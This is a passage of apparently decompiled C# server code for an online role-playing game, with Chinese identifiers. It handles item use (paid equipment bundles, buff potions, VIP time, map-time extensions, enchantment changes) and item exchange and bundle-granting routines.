							Form1.WriteLine(5, "打开1000元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000531:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 1200, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000531, "1200元套餐", num2, num3);
							Form1.WriteLine(5, "打开1200元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000532:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 1500, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000532, "1500元套餐", num2, num3);
							Form1.WriteLine(5, "打开1500元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000533:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 2000, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000533, "2000元套餐", num2, num3);
							Form1.WriteLine(5, "打开2000元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000534:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 2500, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000534, "2500元套餐", num2, num3);
							Form1.WriteLine(5, "打开2500元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000535:
						if (得到包裹空位数() >= 15)
						{
							发送套装(base.Player_Job, base.Player_Sex, 3000, base.Player_Zx, 装备栏包裹[num3].Get物品全局ID, 1008000535, "3000终极套餐", num2, num3);
							Form1.WriteLine(5, "打开3000元套装" + base.Userid + "---" + base.UserName);
						}
						else
						{
							系统提示("背包空位不够了。");
						}
						break;
					case 1008000389:
					{
						if (GetAddState(1008000389))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类59 = new 追加状态类(this, 1800000, num5, 1);
						追加状态列表.Add(追加状态类59.FLD_PID, 追加状态类59);
						状态效果(array, 1, 1800000);
						base.FLD_人物_追加_经验百分比 += 1.5;
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000388:
					{
						if (GetAddState(1008000388))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类56 = new 追加状态类(this, 1800000, num5, 1);
						追加状态列表.Add(追加状态类56.FLD_PID, 追加状态类56);
						状态效果(array, 1, 1800000);
						base.FLD_人物_追加_经验百分比 += 3.0;
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008001021:
					case 1008001022:
					case 1008001023:
					case 1008001024:
					case 1008001025:
						if (装备栏已穿装备[11].Get物品ID == 0L)
						{
							系统提示("必须先穿戴披风才能使用", 9, "系统提示");
						}
						else if (!追加状态列表.ContainsKey(1008001021) && !追加状态列表.ContainsKey(1008001022) && !追加状态列表.ContainsKey(1008001023) && !追加状态列表.ContainsKey(1008001024) && !追加状态列表.ContainsKey(1008001025) && !追加状态列表.ContainsKey(1008001026) && !追加状态列表.ContainsKey(1008001027) && !追加状态列表.ContainsKey(1008001028) && !追加状态列表.ContainsKey(1008001029) && !追加状态列表.ContainsKey(1008001030))
						{
							状态效果(BitConverter.GetBytes(num5), 1, 86400000);
							追加状态类 追加状态类54 = new 追加状态类(this, 86400000, num5, 1);
							追加状态列表.Add(追加状态类54.FLD_PID, 追加状态类54);
							更新武功和状态();
							物品使用(num2, num3, 1);
							计算人物装备数据();
						}
						else
						{
							新吃药提示();
						}
						goto IL_a6ab;
					case 1008000194:
					case 1008000218:
					case 1008000224:
					case 1008000246:
					case 1008000256:
					case 1008000900:
					{
						if (追加状态New列表.Count > 0)
						{
							新吃药提示();
							break;
						}
						if (GetAddState(1008000097) || GetAddState(1008000096) || GetAddState(1008000095) || GetAddState(1008000321) || GetAddState(1008000322) || GetAddState(1008000323) || GetAddState(1008000324) || GetAddState(1008000362) || GetAddState(1008000363) || GetAddState(1008000239) || GetAddState(1008000248))
						{
							新吃药提示();
							break;
						}
						int 时间3 = 7200000;
						switch (num5)
						{
						case 1008000900:
							时间3 = 86400000;
							break;
						case 1008000224:
						case 1008000256:
							时间3 = 3600000;
							break;
						}
						Set追加状态物品(1, 时间3, 15, 2);
						Set追加状态物品(2, 时间3, 15, 2);
						Set追加状态物品(3, 时间3, 1000, 1);
						Set追加状态物品(7, 时间3, 10, 2);
						Set追加状态物品(8, 时间3, 10, 2);
						Set追加状态物品(9, 时间3, 40, 2);
						更新武功和状态();
						if (num5 == 1008000256)
						{
							物品减去属性数量(num3, 1);
						}
						else
						{
							物品使用(num2, num3, 1);
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000865:
						物品使用(num2, num3, 0);
						break;
					case 1008000866:
						物品使用(num2, num3, 0);
						break;
					case 1008000867:
					{
						TimeSpan timeSpan2 = DateTime.Now.AddDays(30.0).Subtract(new DateTime(1970, 1, 1, 8, 0, 0));
						称号药品类 称号药品类2 = new 称号药品类();
						称号药品类2.药品ID = 1008000867;
						称号药品类2.时间 = (int)timeSpan2.TotalSeconds;
						称号药品.Add(称号药品类2.药品ID, 称号药品类2);
						Set武勋物品(称号药品类2);
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008001112:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类46 = new 追加状态类(this, 21600000, num5, 1);
							追加状态列表.Add(追加状态类46.FLD_PID, 追加状态类46);
							base.人物追加最大_HP += 800;
							base.FLD_人物_追加_回避 += 10;
							base.FLD_人物_追加_武功防御力 += 100.0 / World.武功防御力控制;
							base.FLD_人物_追加_攻击 += 100;
							base.FLD_人物_追加_防御 += 50;
							base.FLD_人物_武功攻击力增加百分比 += 0.1;
							状态效果(array, 1, 21600000);
							物品减去属性数量(num3, 1);
							更新HP_MP_SP();
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
						}
						goto IL_a6ab;
					case 1008001111:
						if (!妖花青草)
						{
							妖花青草 = true;
							追加状态类 追加状态类44 = new 追加状态类(this, 21600000, num5, 1);
							追加状态列表.Add(追加状态类44.FLD_PID, 追加状态类44);
							base.人物追加最大_HP += 500;
							base.人物追加最大_MP += 500;
							base.FLD_人物_追加_经验百分比 += 0.04;
							base.FLD_人物_追加_攻击 += 50;
							base.FLD_人物_追加_防御 += 100;
							base.FLD_人物_武功攻击力增加百分比 += 0.1;
							状态效果(array, 1, 21600000);
							物品减去属性数量(num3, 1);
							更新HP_MP_SP();
							更新武功和状态();
							更新广播人物数据();
							更新人物数据(this);
							更新装备效果();
						}
						goto IL_a6ab;
					case 1008001026:
					case 1008001027:
					case 1008001028:
					case 1008001029:
					case 1008001030:
						if (装备栏已穿装备[11].Get物品ID == 0L)
						{
							系统提示("必须先穿戴披风才能使用", 9, "系统提示");
						}
						else if (!追加状态列表.ContainsKey(1008001021) && !追加状态列表.ContainsKey(1008001022) && !追加状态列表.ContainsKey(1008001023) && !追加状态列表.ContainsKey(1008001024) && !追加状态列表.ContainsKey(1008001025) && !追加状态列表.ContainsKey(1008001026) && !追加状态列表.ContainsKey(1008001027) && !追加状态列表.ContainsKey(1008001028) && !追加状态列表.ContainsKey(1008001029) && !追加状态列表.ContainsKey(1008001030))
						{
							状态效果(BitConverter.GetBytes(num5), 1, 604800000);
							追加状态类 追加状态类39 = new 追加状态类(this, 604800000, num5, 1);
							追加状态列表.Add(追加状态类39.FLD_PID, 追加状态类39);
							更新武功和状态();
							物品使用(num2, num3, 1);
							计算人物装备数据();
						}
						else
						{
							新吃药提示();
						}
						goto IL_a6ab;
					case 1008001138:
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					case 1008001137:
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					case 1008001390:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008001391:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008001392:
						if (装备栏包裹[num3].FLD_MAGIC0 < 装备栏包裹[num3].FLD_MAGIC1)
						{
							if (凝神宝珠位置 != -1)
							{
								精神宝珠包(2, 0.0);
								凝神宝珠位置 = -1;
							}
							else
							{
								凝神宝珠位置 = num3;
								精神宝珠包(1, 0.0);
							}
						}
						else
						{
							物品使用(num2, num3, 1);
							base.人物经验 += 装备栏包裹[num3].FLD_MAGIC0;
							计算人物基本数据3();
							更新经验和历练();
							更新金钱和负重();
						}
						goto IL_a6ab;
					case 1008001182:
					case 1008001183:
					case 1008001184:
					case 1008001328:
						物品使用(num2, num3, 1);
						if (活动地图剩余时间 < 0)
						{
							活动地图剩余时间 = 0;
						}
						switch (num5)
						{
						case 1008001328:
							活动地图剩余时间 += 120;
							break;
						case 1008001182:
							活动地图剩余时间 += 240;
							break;
						case 1008001183:
							活动地图剩余时间 += 480;
							break;
						case 1008001184:
							活动地图剩余时间 += 1440;
							break;
						}
						系统提示("续时成功,当前活动地图时间为" + 活动地图剩余时间 + "分钟。");
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					case 1008001331:
						天云岳美容效果(num5);
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					case 1008001332:
						天云岳整容效果(num5);
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					case 1008001543:
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					case 1008001498:
						if (base.Player_WuXun < 0)
						{
							物品减去属性数量(num3, 1);
							base.Player_WuXun += 100;
							if (base.Player_WuXun > 0)
							{
								base.Player_WuXun = 0;
							}
							更新武功和状态();
						}
						else
						{
							系统提示("只有武勋为负数的时候才能使用。");
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 1008001499:
						if (base.Player_WuXun < 0)
						{
							物品使用(num2, num3, 1);
							base.Player_WuXun += 500;
							if (base.Player_WuXun > 0)
							{
								base.Player_WuXun = 0;
							}
							更新武功和状态();
						}
						else
						{
							系统提示("只有武勋为负数的时候才能使用。");
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 1008001500:
						if (base.Player_WuXun < 0)
						{
							物品减去属性数量(num3, 1);
							base.Player_WuXun += 1000;
							if (base.Player_WuXun > 0)
							{
								base.Player_WuXun = 0;
							}
							更新武功和状态();
						}
						else
						{
							系统提示("只有武勋为负数的时候才能使用。");
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 1008001501:
						if (base.Player_WuXun < 0)
						{
							物品使用(num2, num3, 1);
							base.Player_WuXun = 0;
							更新武功和状态();
						}
						else
						{
							系统提示("只有武勋为负数的时候才能使用。");
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 1008001190:
					case 1008001327:
					case 1008001502:
					case 1008001503:
					case 1008001504:
						物品使用(num2, num3, 1);
						if (修炼地图剩余时间 < 0)
						{
							修炼地图剩余时间 = 0;
						}
						switch (num5)
						{
						case 1008001502:
							修炼地图剩余时间 += 240;
							break;
						case 1008001503:
							修炼地图剩余时间 += 480;
							break;
						case 1008001504:
							修炼地图剩余时间 += 1440;
							break;
						case 1008001190:
						case 1008001327:
							修炼地图剩余时间 += 120;
							break;
						}
						系统提示("续时成功,当前修炼地图时间为" + 修炼地图剩余时间 + "分钟。");
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					case 1008001478:
					{
						称号药品类 value9;
						if (称号药品.TryGetValue(1008001479, out value9) || 称号药品.TryGetValue(1008001478, out value9))
						{
							新吃药提示();
							break;
						}
						物品使用(num2, num3, 1);
						DateTime d = DateTime.Now.AddDays(30.0);
						DateTime now = DateTime.Now;
						double num22 = Convert.ToDouble(d.ToString("yyMMddHHmm"));
						TimeSpan timeSpan = d - now;
						称号药品类 称号药品类 = new 称号药品类();
						称号药品类.药品ID = 1008001478;
						称号药品类.时间 = (int)num22;
						称号药品.Add(称号药品类.药品ID, 称号药品类);
						药品新效果(1008001478, 1, 称号药品类.时间, (int)timeSpan.TotalMinutes);
						药品追加对怪攻击 = 150;
						药品追加对怪防御 = 200;
						FLD_药品_追加_气功 = 2;
						Config.武勋开关 = 8;
						RxjhClass.药品记录(base.Userid, base.UserName, 1008001478, "激活斗神称号", 1);
						goto IL_a6ab;
					}
					case 1008001626:
					case 1008001627:
					case 1008001628:
					case 1008001629:
					{
						int int_3 = 0;
						int num19 = 0;
						switch (num5)
						{
						case 1008001626:
							int_3 = 1000001122;
							num19 = 1;
							break;
						case 1008001627:
							int_3 = 1000001123;
							num19 = 2;
							break;
						case 1008001628:
							int_3 = 1000001124;
							num19 = 3;
							break;
						case 1008001629:
							int_3 = 1000001125;
							num19 = 4;
							break;
						}
						if (装备栏已穿装备[3].Get物品ID == 0L)
						{
							四神变更提示(num3, num5, 2);
						}
						else
						{
							物品类 物品类2 = 得到包裹物品(int_3);
							if (物品类2 == null)
							{
								四神变更提示(num3, num5, 3);
							}
							else if (装备栏已穿装备[3].FLD_FJ_四神之力 == 0)
							{
								四神变更提示(num3, num5, 4);
							}
							else if (装备栏已穿装备[3].FLD_FJ_四神之力 == num19)
							{
								四神变更提示(num3, num5, 5);
							}
							else if (base.Player_Money < 5000000L)
							{
								四神变更提示(num3, num5, 6);
							}
							else if (base.人物坐标_地图 == 1201)
							{
								四神变更提示(num3, num5, 7);
							}
							else
							{
								if (RNG.Next(1, 100) > 20)
								{
									base.Player_Money -= 5000000L;
									装备栏已穿装备[3].FLD_FJ_四神之力 = num19;
									四神变更提示(num3, num5, 1);
									初始化已装备物品();
									更新金钱和负重();
								}
								else
								{
									四神变更提示(num3, num5, 8);
								}
								减去物品(num3, 1);
								减去物品(物品类2.物品位置, 1);
								RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
							}
						}
						break;
					}
					case 1008001582:
						物品使用(num2, num3, 1);
						if (base.FLD_VIP != 0)
						{
							base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(1.0);
						}
						else
						{
							base.FLD_VIP = 1;
							base.FLD_VIPTIM = DateTime.Now.AddDays(1.0);
						}
						系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
						保存会员数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 1008001583:
						物品使用(num2, num3, 1);
						if (base.FLD_VIP != 0)
						{
							base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(10.0);
						}
						else
						{
							base.FLD_VIP = 1;
							base.FLD_VIPTIM = DateTime.Now.AddDays(10.0);
						}
						系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
						保存会员数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 1008001584:
						物品使用(num2, num3, 1);
						if (base.FLD_VIP != 0)
						{
							base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(30.0);
						}
						else
						{
							base.FLD_VIP = 1;
							base.FLD_VIPTIM = DateTime.Now.AddDays(30.0);
						}
						系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
						保存会员数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					default:
						try
						{
							foreach (物品兑换类 value33 in World.物品兑换.Values)
							{
								string[] array7 = value33.需要物品.Split(';');
								for (int k = 0; k < array7.Length; k++)
								{
									if (array7[k] != null && int.Parse(array7[k].Split(',')[0]) == num5)
									{
										物品兑换检查(value33);
									}
								}
							}
						}
						catch (Exception ex)
						{
							Form1.WriteLine(2, "物品兑换系统出错--" + ex.Message);
						}
						break;
					case 1008001814:
					{
						if (追加状态列表.ContainsKey(1008001814) || 追加状态列表.ContainsKey(1008000016) || 追加状态列表.ContainsKey(1008000017) || 追加状态列表.ContainsKey(1007000007) || 追加状态列表.ContainsKey(1007000005))
						{
							系统提示("存在相同的药品！");
							break;
						}
						追加状态类 追加状态类6 = new 追加状态类(this, 7200000, 1008001814, 1);
						追加状态列表.Add(追加状态类6.FLD_PID, 追加状态类6);
						状态效果(BitConverter.GetBytes(1008001814), 1, 7200000);
						base.FLD_追加百分比_攻击 += 0.28;
						base.FLD_人物_追加_攻击 += 80;
						base.FLD_追加百分比_防御 += 0.3;
						base.FLD_人物_追加_防御 += 80;
						base.人物追加最大_HP += 3000;
						base.FLD_人物_武功攻击力增加百分比 += 0.35;
						base.FLD_人物_武功防御力增加百分比 += 0.23;
						base.FLD_人物_追加_经验百分比 += 2.1;
						base.FLD_人物_追加_吸魂几率百分比 += 10.0;
						更新武功和状态();
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					}
					case 1008001630:
					case 1008001631:
					case 1008001632:
					case 1008001633:
						{
							int int_ = 0;
							int num6 = 0;
							switch (num5)
							{
							case 1008001630:
								int_ = 1000001122;
								num6 = 1;
								break;
							case 1008001631:
								int_ = 1000001123;
								num6 = 2;
								break;
							case 1008001632:
								int_ = 1000001124;
								num6 = 3;
								break;
							case 1008001633:
								int_ = 1000001125;
								num6 = 4;
								break;
							}
							if (装备栏已穿装备[0].Get物品ID == 0L)
							{
								四神变更提示(num3, num5, 2);
							}
							else
							{
								物品类 物品类 = 得到包裹物品(int_);
								if (物品类 == null)
								{
									四神变更提示(num3, num5, 3);
								}
								else if (装备栏已穿装备[0].FLD_FJ_四神之力 == 0)
								{
									四神变更提示(num3, num5, 4);
								}
								else if (装备栏已穿装备[0].FLD_FJ_四神之力 == num6)
								{
									四神变更提示(num3, num5, 5);
								}
								else if (base.Player_Money < 5000000L)
								{
									四神变更提示(num3, num5, 6);
								}
								else if (base.人物坐标_地图 == 1201)
								{
									四神变更提示(num3, num5, 7);
								}
								else
								{
									if (RNG.Next(1, 100) > 20)
									{
										base.Player_Money -= 5000000L;
										装备栏已穿装备[0].FLD_FJ_四神之力 = num6;
										四神变更提示(num3, num5, 1);
										初始化已装备物品();
										更新金钱和负重();
									}
									else
									{
										四神变更提示(num3, num5, 8);
									}
									减去物品(num3, 1);
									减去物品(物品类.物品位置, 1);
									RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
								}
							}
							break;
						}
						IL_a6ab:
						更新HP_MP_SP();
						break;
					}
				}
				end_IL_0002:;
			}
			catch (Exception ex3)
			{
				Form1.WriteLine(1, "吃药 出错 [" + base.Userid + "][" + base.UserName + "] [" + num + "]" + ex3.Message);
			}
		}

		public void 物品兑换检查(物品兑换类 物品兑换)
		{
			int num = 0;
			string[] array = 物品兑换.需要物品.Split(';');
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == null)
				{
					continue;
				}
				string[] array2 = array[i].Split(',');
				for (int j = 0; j < 66; j++)
				{
					if (Buffer.ToInt32(装备栏包裹[j].物品ID, 0) == int.Parse(array2[0]) && Buffer.ToInt32(装备栏包裹[j].物品数量, 0) >= int.Parse(array2[1]))
					{
						num++;
						break;
					}
				}
			}
			if (num == array.Length)
			{
				for (int k = 0; k < num; k++)
				{
					string[] array3 = array[k].Split(',');
					for (int l = 0; l < 66; l++)
					{
						if (Buffer.ToInt32(装备栏包裹[l].物品ID, 0) == int.Parse(array3[0]))
						{
							减去物品(l, int.Parse(array3[1]));
							break;
						}
					}
				}
				兑换物品(物品兑换);
			}
			else
			{
				系统提示("物品不全,不能兑换。");
			}
		}

		public void 兑换物品(物品兑换类 物品兑换)
		{
			if (物品兑换.武勋 != 0)
			{
				base.Player_WuXun += 物品兑换.武勋;
				系统提示("得到武勋" + 物品兑换.武勋 + "点。");
				更新武功和状态();
			}
			if (物品兑换.元宝 != 0)
			{
				查百宝阁元宝数();
				检察元宝数据(物品兑换.元宝, 1);
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "物品兑换", 1, 物品兑换.元宝);
				保存元宝数据();
			}
			if (物品兑换.套装 != 0)
			{
				int num = 得到包裹空位位置();
				if (num == -1)
				{
					系统提示("背包没有空位了。");
					return;
				}
				增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(物品兑换.套装), num, Buffer.GetBytes(1), new byte[56], true);
				系统提示("恭喜你获得一套装备。快快打开看吧。");
			}
			if (物品兑换.金钱.Length != 0)
			{
				base.Player_Money += long.Parse(物品兑换.金钱);
				系统提示("得到游戏币" + 物品兑换.金钱 + "两。");
				得到钱的提示(uint.Parse(物品兑换.金钱));
				更新金钱和负重();
			}
			if (物品兑换.单件物品.Length == 0)
			{
				return;
			}
			string[] array = 物品兑换.单件物品.Split(';');
			int num2 = 0;
			while (true)
			{
				if (num2 < Convert.ToInt32(array[1]))
				{
					int num3 = 得到包裹空位位置();
					if (num3 == -1)
					{
						break;
					}
					增加物品带属性(Convert.ToInt32(array[0]), num3, 1, Convert.ToInt32(array[2]), Convert.ToInt32(array[3]), Convert.ToInt32(array[4]), Convert.ToInt32(array[5]), Convert.ToInt32(array[6]), Convert.ToInt32(array[7]), Convert.ToInt32(array[8]), Convert.ToInt32(array[9]), Convert.ToInt32(array[10]), 0);
					num2++;
					continue;
				}
				return;
			}
			系统提示("背包没有空位了。");
		}

		public int 取套装物品ID(int 职业, int level, int reside, int sex, int zx)
		{
			foreach (ItmeClass value in World.Itme.Values)
			{
				if (value.FLD_RESIDE1 == 职业 && value.FLD_RESIDE2 == reside && (value.FLD_SEX == sex || value.FLD_SEX == 0) && value.FLD_LEVEL == level && (value.FLD_ZX == zx || value.FLD_ZX == 0))
				{
					return value.FLD_PID;
				}
			}
			return 0;
		}

		public void 发送套装(int job, int sex, int type, int zx, double 物品全局ID, int 物品ID, string 物品名, int 包ID, int 包位置)
		{
			try
			{
				物品使用(包ID, 包位置, 1);
				foreach (ItemSellClass item in World.套装数据)
				{
					if (item.Type == type)
					{
						int 物品ID2 = 0;
						switch (item.Reside)
						{
						case 1:
							if (type == 200)
							{
								物品ID2 = 取套装物品ID(job, 10, 1, sex, zx);
							}
							else
							{
								物品ID2 = 取套装物品ID(job, 150, 1, sex, zx);
								if (type == 1000)
								{
									增加物品带属性(物品ID2, 得到包裹空位位置(), 1, 1020001915, 110000100, 110000100, 110000100, 110000100, 5, 46, 2, 1, 0);
								}
							}
							break;
						case 2:
							if (type == 200)
							{
								物品ID2 = ((job != 11) ? 500002 : 500102);
							}
							else
							{
								物品ID2 = 取套装物品ID(job, 150, 2, sex, zx);
								if (type == 1000)
								{
									增加物品带属性(物品ID2, 得到包裹空位位置(), 1, 20000015, 110000100, 110000100, 110000100, 110000100, 0, 0, 2, 1, 0);
								}
							}
							break;
						case 4:
							switch (job)
							{
							case 1:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 100200001);
								break;
							case 2:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 200200001);
								break;
							case 3:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 300200001);
								break;
							case 4:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 400200001);
								break;
							case 5:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 500200001);
								break;
							case 6:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 700200002);
								break;
							case 7:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 800200001);
								break;
							case 8:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 100204001);
								break;
							case 9:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 200204001);
								break;
							case 10:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 900200010);
								break;
							case 11:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 400204002);
								break;
							case 12:
								物品ID2 = ((type != 200) ? 取套装物品ID(job, 150, 4, sex, zx) : 300204002);
								break;
							}
							if (type == 1000 && (base.Player_Job == 4 || base.Player_Job == 6))
							{
								增加物品带属性(物品ID2, 得到包裹空位位置(), 1, 1010001915, 80000002, 80000002, 80000002, 80000002, 5, 36, 2, 1, 0);
							}
							break;
						case 5:
							if (type == 200)
							{
								物品ID2 = ((job != 11) ? 800003 : 800103);
							}
							else
							{
								物品ID2 = 取套装物品ID(job, 150, 5, sex, zx);
								if (type == 1000)
								{
									增加物品带属性(物品ID2, 得到包裹空位位置(), 1, 20000015, 110000100, 110000100, 110000100, 110000100, 0, 0, 2, 1, 0);
								}
							}
							break;
						case 6:
							if (type == 200)
							{
								物品ID2 = ((job != 11) ? 400001 : 400101);
							}
							else
							{
								物品ID2 = 取套装物品ID(job, 150, 6, sex, zx);
								if (type == 1000)
								{
									增加物品带属性(物品ID2, 得到包裹空位位置(), 1, 20000015, 110000100, 110000100, 0, 0, 0, 0, 2, 1, 0);
								}
							}
							break;
						case 7:
							物品ID2 = ((type == 100 || type == 300) ? 100021 : ((job != 11) ? 100028 : 100125));
							break;
						case 8:
							物品ID2 = ((type == 100 || type == 300) ? 16 : ((job != 11) ? 23 : 123));
							break;
						case 10:
							物品ID2 = ((type == 100 || type == 300) ? 700022 : ((job != 11) ? 700028 : 700128));
							break;
						}
						int num = 得到包裹空位位置();
						if (num != -1)
						{
							增加物品带属性(物品ID2, num, 1, item.Magic0 + item.Magic1, item.Magic2, item.Magic3, item.Magic4, item.Magic5, item.觉醒, item.中级附魂, item.进化, item.BD, item.DAYS);
						}
					}
				}
				if (type == 1000)
				{
					int 物品ID3 = 0;
					if (base.Player_Zx == 1 && base.Player_Sex == 1)
					{
						物品ID3 = 900109;
					}
					else if (base.Player_Zx == 1 && base.Player_Sex == 2)
					{
						物品ID3 = 900110;
					}
					else if (base.Player_Zx == 2 && base.Player_Sex == 1)
					{
						物品ID3 = 900111;
					}
					else if (base.Player_Zx == 2 && base.Player_Sex == 2)
					{
						物品ID3 = 900112;
					}
					增加物品带属性(物品ID3, 得到包裹空位位置(), 1, 0, 80000001, 80000001, 80000001, 80000001, 0, 0, 0, 0, 0);
				}
				switch (type)
				{
				case 300:
					if (base.Player_Sex == 1)
					{
						增加物品带属性(16900001, 得到包裹空位位置(), 1, 0, 80000001, 80000001, 80000001, 80000001, 0, 0, 0, 0, 0);
					}
					else
					{
						增加物品带属性(26900075, 得到包裹空位位置(), 1, 0, 80000001, 80000001, 80000001, 80000001, 0, 0, 0, 0, 0);
					}
					break;
				case 600:
				case 1000:
					if (base.Player_Sex == 1)
					{
						增加物品带属性(16900001, 得到包裹空位位置(), 1, 0, 80000001, 80000001, 80000001, 80000001, 0, 0, 0, 0, 0);
					}
					else
					{
						增加物品带属性(26900075, 得到包裹空位位置(), 1, 0, 80000001, 80000001, 80000001, 80000001, 0, 0, 0, 0, 0);
					}
					break;
				}
				RxjhClass.物品记录(base.Userid, base.UserName, base.Userid, base.UserName, 物品全局ID, 物品ID, 物品名, 1, "0", type, "打开套装");
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "打开套装出错--" + ex.Message);
			}
		}

		public void 附混石头()
		{
			int num = 0;
			int num2 = 0;
			int num3 = 0;
			int num4 = 0;
			int num5 = 0;
			for (int i = 0; i < 66; i++)
			{
				if (Buffer.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000161)
				{
					num = 1;
				}
				else if (Buffer.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000162)
				{
					num2 = 1;
				}
				else if (Buffer.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000163)
				{
					num3 = 1;
				}
				else if (Buffer.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000164)
				{
					num4 = 1;
				}
				else if (Buffer.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000199)
				{
					num5 = 1;
				}
			}
			if (num != 0 && num2 != 0 && num3 != 0 && num4 != 0 && num5 != 0)
			{
				for (int j = 0; j < 66; j++)
				{
					if (Buffer.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000161)
					{
						减去物品(j, 1);
					}
					else if (Buffer.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000162)
					{
						减去物品(j, 1);
					}
					else if (Buffer.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000163)
					{
						减去物品(j, 1);
					}
					else if (Buffer.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000164)
					{
						减去物品(j, 1);
					}
